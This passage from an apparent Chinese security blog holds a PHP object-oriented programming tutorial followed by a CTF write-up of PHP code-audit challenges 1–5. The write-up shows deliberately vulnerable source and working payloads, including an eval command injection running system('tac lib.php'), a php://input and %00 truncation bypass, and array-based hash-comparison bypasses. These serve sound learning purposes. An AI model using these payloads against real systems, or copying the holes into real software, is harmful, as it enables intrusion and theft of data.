        <tag>中间件漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP面向对象学习</title>
    <url>/2020/04/08/PHPstudy/</url>
    <content><![CDATA[<p>PHP基础学习<a id="more"></a></p>
<h1 id="面向过程"><a href="#面向过程" class="headerlink" title="面向过程"></a>面向过程</h1><p>就是分析出解决问题所需要的步骤，然后用函数把这些步骤一步一步实现，使用的时候一个一个依次调用就可以。<br><img src="/2020/04/08/PHPstudy/1.png" alt></p>
<h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><p>是把构成问题事务分解成各个对象，建立对象的目的不是为了完成一个步骤，而是为了描叙某个事物在整个解决问题的步骤中的行为。<img src="/2020/04/08/PHPstudy/2.png" alt></p>
<p> 对象包含两个部分：</p>
<ul>
<li>对象的组成元素<ul>
<li>是对象的<code>数据模型</code>，用于描述对象的数据<br>又称为对象的<code>属性</code>，或者对象的<code>成员变量</code> </li>
</ul>
</li>
<li>对象的行为<ul>
<li>是对象的<code>行为模型</code>，用于描述对象能够做什么事情<br>又被称为对象的<code>方法</code> </li>
</ul>
</li>
</ul>
<h1 id="类和对象的关系"><a href="#类和对象的关系" class="headerlink" title="类和对象的关系"></a>类和对象的关系</h1><p>　　类的实体化结果是对象，而对象的抽象就是类。在开发过程中，我们通常都是先抽象(幻想)出一个类，再用该类去创建对象(实现幻想的内容)。在程序中，直接使用的是我们(实现幻想)的对象，而不是抽象(幻想)的类。</p>
<h1 id="类的定义"><a href="#类的定义" class="headerlink" title="类的定义"></a>类的定义</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">	<span class="comment">//成员属性(对象属性)	静态特征</span></span><br><span class="line">	<span class="keyword">public</span> $name=<span class="string">"cyz"</span>;  <span class="comment">//public全局的</span></span><br><span class="line">	<span class="keyword">public</span> $sex=<span class="string">"man"</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="string">"19"</span>;</span><br><span class="line">	<span class="comment">//成员方法</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&#123;$this-&gt;name&#125;是&#123;$this-&gt;sex&#125;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="定义类的成员属性"><a href="#定义类的成员属性" class="headerlink" title="定义类的成员属性"></a>定义类的成员属性</h1><p>类中只有两个内容，分别为成员属性和成员方法。类的成员就是对象，因此又称为‘对象属性’”对象方法”。<br>定义格式：</p>
<blockquote>
<p>权限控制符    变量名 = 变量值;</p>
<p>变量值可有可无</p>
</blockquote>
<p>访问修饰符</p>
<blockquote>
<p>public(公共权限)，在任何地方都可以访问，主要指类内部、类外部、子类中都可以访问。</p>
<p>protected(受保护的权限)    只能在本类中、子类中被访问，在类外不能访问。</p>
<p>private(私有权限的)    只能在本类中访问</p>
</blockquote>
<h1 id="定义类的成员方法"><a href="#定义类的成员方法" class="headerlink" title="定义类的成员方法"></a>定义类的成员方法</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">	<span class="comment">//成员属性(对象属性)	静态特征</span></span><br><span class="line">	<span class="keyword">public</span> $name=<span class="string">"cyz"</span>;  <span class="comment">//public全局的</span></span><br><span class="line">	<span class="keyword">public</span> $sex=<span class="string">"man"</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="string">"19"</span>;</span><br><span class="line">	<span class="comment">//成员方法（对象方法）：一个方法完成一个小功能</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&#123;$this-&gt;name&#125;是&#123;$this-&gt;sex&#125;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="类的实例化"><a href="#类的实例化" class="headerlink" title="类的实例化"></a>类的实例化</h1><p>在PHP中，访问对象的属性和方法，使用<code>-&gt;</code>来访问，$obj-&gt;name,$obj-&gt;funname()</p>
<blockquote>
<p>$obj = new classname;<br>$obj = new classname();<br>$obj = new classname(实参1,实参2….);</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">	<span class="comment">//成员属性</span></span><br><span class="line">	<span class="keyword">public</span> $name=<span class="string">"cyz"</span>;  <span class="comment">//public全局的</span></span><br><span class="line">	<span class="keyword">public</span> $sex=<span class="string">"man"</span>;</span><br><span class="line">	<span class="keyword">public</span> $age;</span><br><span class="line">	<span class="comment">//成员方法</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&#123;$this-&gt;name&#125;是&#123;$this-&gt;sex&#125;,年龄为&#123;$this-&gt;age&#125;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Student();</span><br><span class="line"><span class="comment">//$a-&gt;age表示访问$age变量值的属性</span></span><br><span class="line"><span class="comment">//对象访问属性，属性不加$</span></span><br><span class="line">$a-&gt;age=<span class="string">"19"</span>;</span><br><span class="line">print_r($a);</span><br><span class="line">$a-&gt;showInfo();</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/08/PHPstudy/3.png" alt><br>如果给不存在的属性赋值就相当于添加新属性。</p>
<h1 id="对象方法操作"><a href="#对象方法操作" class="headerlink" title="对象方法操作"></a>对象方法操作</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">	<span class="comment">//成员属性</span></span><br><span class="line">	<span class="keyword">public</span> $name=<span class="string">"cyz"</span>;  <span class="comment">//public全局的</span></span><br><span class="line">	<span class="keyword">public</span> $sex=<span class="string">"man"</span>;</span><br><span class="line">	<span class="keyword">public</span> $age;</span><br><span class="line">	<span class="comment">//成员方法</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span><span class="params">($age,$name)</span></span>&#123;</span><br><span class="line">		$str = $name.<span class="string">"是"</span>.$age.<span class="string">"岁了"</span>;</span><br><span class="line">		<span class="keyword">return</span> $str;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Student();</span><br><span class="line"><span class="keyword">echo</span> $a-&gt;showInfo(<span class="number">22</span>,<span class="string">"cyzcc"</span>);</span><br></pre></td></tr></table></figure>

<h1 id="this变量的使用"><a href="#this变量的使用" class="headerlink" title="$this变量的使用"></a>$this变量的使用</h1><blockquote>
<p>php中$this代表当前对象，用来调用对象的属性和方法</p>
<p>$this 只能在成员方法中存在，其他地方都不能使用。</p>
<p>当使用$obj对象调用成员方法时，自动将当前对象$obj传递到成员方法中，在成员方法中，使用$this变量来代替传递过来的$obj变量</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">	<span class="comment">//成员属性</span></span><br><span class="line">	<span class="keyword">private</span> $name=<span class="string">"cyz"</span>;  <span class="comment">//public全局的</span></span><br><span class="line">	<span class="keyword">private</span> $sex=<span class="string">"man"</span>;</span><br><span class="line">	<span class="keyword">private</span> $age=<span class="string">"222"</span>;</span><br><span class="line">	<span class="comment">//成员方法</span></span><br><span class="line">	<span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">showline</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"&lt;hr /&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$str = <span class="string">"&#123;$this-&gt;name&#125;的基本信息"</span>;</span><br><span class="line">		$str .=<span class="keyword">$this</span>-&gt;showline(); </span><br><span class="line">		$str .= <span class="keyword">$this</span>-&gt;name.<span class="string">"是"</span>.<span class="keyword">$this</span>-&gt;age.<span class="string">"岁了"</span>;</span><br><span class="line">		<span class="keyword">echo</span>  $str;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Student();</span><br><span class="line">$a-&gt;showInfo();</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/08/PHPstudy/4.png" alt></p>
<h1 id="定义类的常量"><a href="#定义类的常量" class="headerlink" title="定义类的常量"></a>定义类的常量</h1><blockquote>
<p>类常量，就是类的常量，与对象无关。</p>
<p>类常量，只能通过类名来调用(类名::常量)，成员的东西只能通过对象来调用</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> DB_host=<span class="string">"127.0.0.1"</span>;</span><br><span class="line">	<span class="keyword">const</span> DB_user=<span class="string">"root"</span>;</span><br><span class="line">	<span class="keyword">const</span> DB_pass=<span class="string">"root"</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$str = <span class="string">"主机名："</span>.Student::DB_host;</span><br><span class="line">		$str .=<span class="string">"&lt;br&gt;用户名："</span>.Student::DB_user; </span><br><span class="line">		$str .=<span class="string">"&lt;br&gt;密码："</span>.Student::DB_pass;</span><br><span class="line">		<span class="keyword">echo</span>  $str;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//直接访问类的常量</span></span><br><span class="line">$str = <span class="string">"主机名："</span>.Student::DB_host;</span><br><span class="line">$str .=<span class="string">"&lt;br&gt;用户名："</span>.Student::DB_user; </span><br><span class="line">$str .=<span class="string">"&lt;br&gt;密码："</span>.Student::DB_pass;</span><br><span class="line"><span class="keyword">echo</span> $str.<span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line"><span class="comment">//通过方法访问</span></span><br><span class="line">$a = <span class="keyword">new</span> Student();</span><br><span class="line">$a-&gt;showInfo();</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/08/PHPstudy/5.png" alt></p>
<h1 id="self"><a href="#self" class="headerlink" title="self"></a>self</h1><p>$this代表当前对象，self代表当前类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> DB_host=<span class="string">"127.0.0.1"</span>;</span><br><span class="line">	<span class="keyword">const</span> DB_user=<span class="string">"root"</span>;</span><br><span class="line">	<span class="keyword">const</span> DB_pass=<span class="string">"root"</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$str = <span class="string">"主机名："</span>.Student::DB_host;</span><br><span class="line">		$str .=<span class="string">"&lt;br&gt;用户名："</span>.<span class="keyword">self</span>::DB_user; </span><br><span class="line">		$str .=<span class="string">"&lt;br&gt;密码："</span>.<span class="keyword">self</span>::DB_pass;</span><br><span class="line">		<span class="keyword">echo</span>  $str;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//直接访问类的常量</span></span><br><span class="line">$str = <span class="string">"主机名："</span>.Student::DB_host;</span><br><span class="line">$str .=<span class="string">"&lt;br&gt;用户名："</span>.Student::DB_user; </span><br><span class="line">$str .=<span class="string">"&lt;br&gt;密码："</span>.Student::DB_pass;</span><br><span class="line"><span class="keyword">echo</span> $str.<span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line"><span class="comment">//通过方法访问</span></span><br><span class="line">$a = <span class="keyword">new</span> Student();</span><br><span class="line">$a-&gt;showInfo();</span><br></pre></td></tr></table></figure>

<h1 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h1><p>构造方法是对象创建完成后第一个被对象自动调用的方法，会初始化这个对象，当使用new关键字实例化对象时会自动触发。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class Person&#123;</span><br><span class="line">        //下面是声明人的成员属性，都是没有初始值的，在创建对象时，使用构造方法赋给初始值</span><br><span class="line">      var $name;   //定义人的名字</span><br><span class="line">      var $sex;    //定义人的性别</span><br><span class="line">      var $age;    //定义人的年龄         </span><br><span class="line">      function __construct($name=&quot;SQYY&quot;,$sex=&quot;男&quot;,$age=1)&#123;</span><br><span class="line">        $this -&gt; name = $name; //在创建对象时，使用传入的参数$name为成员属性 $this-&gt;name赋初值</span><br><span class="line">        $this -&gt; sex = $sex;    //在创建对象时，使用传入的参数$sex为成员属性 $this-&gt;sex赋初值</span><br><span class="line">        $this -&gt; age = $age;    //在创建对象时，使用传入的参数$sex为成员属性 $this-&gt;age赋初值</span><br><span class="line">      &#125;</span><br><span class="line">        //下面声明人的成员方法</span><br><span class="line">        function say()&#123;</span><br><span class="line">            echo &quot;我的名字：&quot; .$this -&gt;name. &quot; ,性别：&quot; .$this -&gt; sex .&quot;  年龄&quot; .$this -&gt;age. &quot;。&lt;br&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">  $person1 = new Person();       //创建对象$person1时会自动执行构造方法，默认传参</span><br><span class="line">  $person2 = new Person(&apos;张三&apos;);   //创建对象$person2时会自动执行构造方法，传入第一个参数，其他默认传参</span><br><span class="line">    $person3 = new Person(&apos;李四&apos;,&apos;男&apos;);        //创建对象$person3时会自动执行构造方法，传入前两个参数，其他默认传参</span><br><span class="line">    $person4 = new Person(&apos;王五&apos;,&apos;女&apos;,&apos;20&apos;);   //创建对象$person4时会自动执行构造方法，传入所有参数</span><br><span class="line">     </span><br><span class="line">    $person1 -&gt;say();</span><br><span class="line">    $person2 -&gt;say();</span><br><span class="line">    $person3 -&gt;say();</span><br><span class="line">    $person4 -&gt;say();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/08/PHPstudy/6.png" alt></p>
<h1 id="析构方法"><a href="#析构方法" class="headerlink" title="析构方法"></a>析构方法</h1><p>对象在销毁之前最后一个被对象自动调用的方法,先创建 传入变量后销毁</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="comment">// 定义一个汽车的类</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">car</span></span>&#123;</span><br><span class="line">        <span class="comment">// 成员属性</span></span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="keyword">public</span> $color;</span><br><span class="line">        <span class="comment">//构造方法</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name,$color)</span></span>&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;color = $color;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"你创建了"</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 析构方法</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"你销毁了"</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 实例化对象</span></span><br><span class="line">    $hanma = <span class="keyword">new</span> car(<span class="string">'悍马'</span>,<span class="string">'粉色'</span>,<span class="string">'H2'</span>);</span><br><span class="line">    $bmw = <span class="keyword">new</span> car(<span class="string">'宝马'</span>,<span class="string">'红色'</span>,<span class="string">'X7'</span>);</span><br><span class="line">    $benchi = <span class="keyword">new</span> car(<span class="string">'奔驰'</span>,<span class="string">'黑色'</span>,<span class="string">'s600'</span>);</span><br><span class="line">    <span class="comment">// unset($bmw);</span></span><br><span class="line">    $bmw = <span class="string">'1111'</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/08/PHPstudy/7.png" alt><br>如果我们不引用变量，创建完对象之后就会立即销毁。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="comment">// 定义一个汽车的类</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">car</span></span>&#123;</span><br><span class="line">        <span class="comment">// 成员属性</span></span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="keyword">public</span> $color;</span><br><span class="line">        <span class="comment">//构造方法</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name,$color)</span></span>&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;color = $color;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"你创建了"</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 析构方法</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"你销毁了"</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 实例化对象</span></span><br><span class="line">     <span class="keyword">new</span> car(<span class="string">'悍马'</span>,<span class="string">'粉色'</span>,<span class="string">'H2'</span>);</span><br><span class="line">    <span class="keyword">new</span> car(<span class="string">'宝马'</span>,<span class="string">'红色'</span>,<span class="string">'X7'</span>);</span><br><span class="line">    <span class="keyword">new</span> car(<span class="string">'奔驰'</span>,<span class="string">'黑色'</span>,<span class="string">'s600'</span>);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/08/PHPstudy/8.png" alt></p>
]]></content>
      <tags>
        <tag>PHP学习</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP_Code_Challenge</title>
    <url>/2020/05/12/PHP_Code_Challenge/</url>
    <content><![CDATA[<h1 id="PHP-Code-Challenge"><a href="#PHP-Code-Challenge" class="headerlink" title="PHP_Code_Challenge"></a>PHP_Code_Challenge</h1><a id="more"></a>

<p>PHP_Code_Challenge总结了一些常见的php代码审计的题目，共30关 </p>
<p>题目地址：<br><a href="https://ctf.hutc.xyz" target="_blank" rel="noopener">HUCTF</a><br>148.70.62.239:{port}    Port 23001-23030<br><a href="https://gitee.com/cnwill_sec/PHPCodeChallenge" target="_blank" rel="noopener">https://gitee.com/cnwill_sec/PHPCodeChallenge</a></p>
<h1 id="challenge1"><a href="#challenge1" class="headerlink" title="challenge1"></a>challenge1</h1><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY= </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(hex2bin(strrev(bin2hex($flag)))), <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>使用给出的加密逆向解密上面的字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">hex2bin		<span class="comment">#把十六进制值转换为 ASCII 字符</span></span><br><span class="line">strrev		<span class="comment">#反转字符串</span></span><br><span class="line">bin2hex		<span class="comment">#把字符串转换为十六进制值</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$str = <span class="string">'1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY='</span>;</span><br><span class="line"><span class="keyword">echo</span> hex2bin(strrev(bin2hex(base64_decode($str))));</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/12/PHP_Code_Challenge/1588672298533.png" alt="1588672298533"></p>
<h1 id="challenge2"><a href="#challenge2" class="headerlink" title="challenge2"></a>challenge2</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'time'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($_GET[<span class="string">'time'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'The time must be number.'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'This time is too short.'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'This time is too long.'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        sleep((int)$_GET[<span class="string">'time'</span>]);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>time必须小于60 * 60 * 24 * 30 * 3，大于60 * 60 * 24 * 30 * 2，is_numeric可以使用科学计数法或者十六进制绕过，即time=0x4f1a00或者time=7e6</p>
<p><img src="/2020/05/12/PHP_Code_Challenge/1588673393193.png" alt="1588673393193"></p>
<h1 id="challenge3"><a href="#challenge3" class="headerlink" title="challenge3"></a>challenge3</h1><p>查看网页源码发现challenge3.txt，访问得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--challenge3.txt--&gt;"</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">    header(<span class="string">'Location: challenge3.php?id=1'</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))			<span class="comment">//查看.在$a中第一次出现的位置，这里为不能出现.</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hahahahahaha'</span>;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);		<span class="comment">//将$a写入$data</span></span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>需要满足的条件</p>
<blockquote>
<p>1.$a不能出现<code>.</code>，或者<code>.</code>在第一位，这样条件就为0，不满足<br>2.通过$a写入$data的字符串要为<code>1112 is a nice lab!</code><br>3.id==0<br>4.$b长度大于5，并且111与$b字符串被截取的第一位字符连结后形成的字符串能在1114中匹配到<br>，即连结后的字符串可以是111也可以是1114<br>5.$b第一位不能为4</p>
</blockquote>
<p>解决</p>
<blockquote>
<p>1、2<br>$a=php://input，即<code>file_get_contents(&#39;php://input&#39;,&#39;r&#39;)</code>时<br>$data取请求原始数据流，即post的内容，<code>$a=php://input</code><br>$data取post的数据，post <code>1112 is a nice lab!</code> 即可</p>
<p>3<br>php弱类型比较，数字与字符串等值比较时，字符串取开头的有效数字，无则为0<br>id=a</p>
<p>4、5<br>%00截断对substr有效，对strlen无效（即%00不会对strlen截断）,所以构造</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">GET:</span> id=a<span class="variable">&amp;a</span>=php:<span class="comment">//input&amp;b=%001111111</span></span><br><span class="line"><span class="symbol">POST:</span><span class="number">1112</span> is a nice lab!</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1588686122983.png" alt="1588686122983"></p>
<p>这里使用有些hackbar不能打通，可以更换hackbar或者使用burp</p>
<h1 id="challenge4"><a href="#challenge4" class="headerlink" title="challenge4"></a>challenge4</h1><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($a);"</span>);</span><br></pre></td></tr></table></figure>

<p>简单的命令执行，过滤了cat，使用tac<br>payload</p>
<blockquote>
<p>hello=system(%27tac%20lib.php%27)</p>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1588686655614.png" alt="1588686655614"></p>
<h1 id="challenge5"><a href="#challenge5" class="headerlink" title="challenge5"></a>challenge5</h1><p>一个登陆框，可以看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Your password can not be your name!&lt;/p&gt;'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password.&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;p&gt;Login first!&lt;/p&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>md5弱类型比较，数组绕过即可<br>payload</p>
<blockquote>
<p>name[]=admin&amp;password[]=a</p>
</blockquote>
